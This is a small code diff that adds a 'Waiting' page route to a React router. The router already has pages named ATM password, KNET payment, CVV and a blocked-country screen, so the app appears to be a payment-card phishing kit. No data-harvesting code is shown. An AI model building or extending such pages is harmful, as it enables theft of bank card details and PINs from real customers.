@@ -33,6 +33,7 @@ import ATMPassword from "./pages/ATMPassword";
 import KNETPayment from "./pages/KNETPayment";
 import CVV from "./pages/CVV";
 import FinalPage from "./pages/FinalPage";
+import Waiting from "./pages/Waiting";
 
 function BlockedCountryPage() {
   return (
@@ -73,6 +74,7 @@ function Router() {
       <Route path={"/atm-password"} component={ATMPassword} />
       <Route path={"/knet-payment"} component={KNETPayment} />
       <Route path={"/cvv"} component={CVV} />
+      <Route path={"/waiting"} component={Waiting} />
       <Route path={"/final-page"} component={FinalPage} />
 
       <Route path={"/404"} component={NotFound} />
